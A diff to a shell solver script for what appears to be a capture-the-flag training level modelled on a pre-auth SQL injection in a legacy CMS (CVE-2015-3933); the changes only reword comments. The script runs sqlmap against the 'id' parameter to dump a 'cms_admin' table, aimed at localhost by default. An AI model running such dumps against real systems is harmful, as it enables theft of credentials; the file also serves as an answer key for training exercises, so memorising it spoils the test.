@@ -4,12 +4,12 @@
 # This floor models the real-world class of bug behind CVE-2015-3933
 # (GeniX CMS): an ancient, unauthenticated content-management endpoint that
 # takes a page/module selector plus a record `id` in the URL, and splices
-# that `id` straight into a query with no escaping at all. The lesson isn't
-# a new SQL technique (see solvers/p2_1.sh for the sqlmap-workflow floor),
-# it's that a public CVE advisory names a *pattern* ("legacy CMS, GET
-# param, pre-auth SQLi"), and the job is recognizing that pattern in code
-# nobody has looked at in years, then confirming it exactly the way you'd
-# confirm any other injection: point sqlmap at the parameter and dump.
+# that `id` straight into a query with no escaping at all. The lesson: a
+# public CVE advisory names a *pattern* ("legacy CMS, GET param, pre-auth
+# SQLi"), and the job is recognizing that pattern in code nobody has looked
+# at in years, then confirming it exactly the way you'd confirm any other
+# injection: point sqlmap at the parameter, let it confirm, then enumerate
+# downward, the standard sqlmap workflow every floor in this phase uses.
 set -uo pipefail
 
 BASE="${SEIYAKU_BASE:-http://localhost:8000}"
@@ -38,10 +38,9 @@ echo "[p2_2] saved raw request to ${REQ}:"
 sed 's/^/  | /' "$REQ"
 
 echo "[p2_2] running: sqlmap -r req.txt -p id --batch --dump -T cms_admin"
-# --ignore-stdin: same non-interactive gotcha as p2_1, without it, a
-# closed/non-tty stdin races -r's request file as a second target source
-# and sqlmap exits having scanned nothing. See solvers/p2_1.sh for the
-# full explanation.
+# --ignore-stdin: without it, a closed/non-tty stdin races -r's request
+# file as a second target source and sqlmap exits having scanned nothing.
+# See this floor's DEBRIEF.md for the full explanation.
 sqlmap -r "$REQ" -p id --batch --ignore-stdin --dump -T cms_admin \
     --output-dir="$OUTDIR" 2>&1 | tee "$LOG"
 
